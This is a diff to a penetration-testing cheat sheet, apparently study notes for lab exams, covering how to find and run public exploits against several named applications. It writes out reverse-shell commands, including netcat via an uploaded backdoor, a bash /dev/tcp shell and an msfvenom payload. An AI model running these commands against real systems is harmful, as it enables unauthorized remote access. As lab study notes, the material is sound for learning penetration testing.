@@ -4,7 +4,7 @@
 - [Encode-Decode-Hash](#encode-decode-hash)
 - [Reverse shell](#reverse-shell)
 - [Files transfer](#files-transfer)
-- [Public exploit](pPublic-exploit)
+- [Public exploit](#Public-exploit)
 - [Remote to other machines](#remote-to-other-machines)
 - [Ports scan](#ports-scan)
 - [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
@@ -556,6 +556,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 # Public exploit  
 - Search exploit by service + version  
   `searchsploit vsftpd 2.3.4`
+  `searchsploit remote smb microsoft windows`
+- select "Remote Code Execution"  
 - common search words
   E.g: proftpd 1.3.5, joomla rce, kernel 5.x, samba, apache 2.4.49 rce,  ms17_010, windows iis rce, searchsploit linux kernel 5.4, CVE-2017-0144, windows local privilege escalation  
 - Copy exploit locally    
@@ -563,23 +565,31 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - Fixing/Modifying exploits
   - change IP/port for reverse shell
   - adjust target path in web RCE
-  - modify payload type cmd.exe, powershell, /bin/bash 
-- Compile exploit in kali
-  - Compiling the exploit: `kali@kali:~ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
+  - modify payload type cmd.exe, powershell, /bin/bash
+- software version: qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)
+  - `searchsploit qdPM 9.1`: php/webapps/50944.py  
+  - `searchsploit -m 50944`  
+  - `python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp`
+  - `curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"`  
+- **.c program** need compile to .exe
+  - `searchsploit "Sync Breeze Enterprise 10.0.28"`: windows/dos/42341.c
+  - modify the 42341.c (ip, port, target, shellcode)  
+  - Compiling the exploit: `kali@kali:~ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`      
   - setting up a Netcat listener on port 443: `kali@kali:~$ sudo nc -lvp 443`  
   - Running the final version of the exploit: `kali@kali:~ sudo wine syncbreeze_exploit.exe`  
-- attack WiFi Mouse 1.7.8.5 - Remote Code Execution
+- **Upload**: WiFi Mouse 1.7.8.5 - Remote Code Execution
   - `searchsploit "mouse server"`: windows/remote/50972.py
   - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
   - start webserver, and listener
   - `python3 mouseserver_50972.py <target> <kali> shell64.exe`  
-- attack Apache httpd 2.4.49 - Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+- **Bash script**: Apache httpd 2.4.49 - Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
   - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh  
+  - start listener   
   - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`  
-- attack CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution  
-  - modify 44976.py (credentials, url, verify=false)
+- **Python execute directly**: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution    
+  - modify 44976.py (credentials, url, verify=false)    
   - `python2 44976.py`  
-  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`   
+  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`    
 
 # Remote to other machines
 
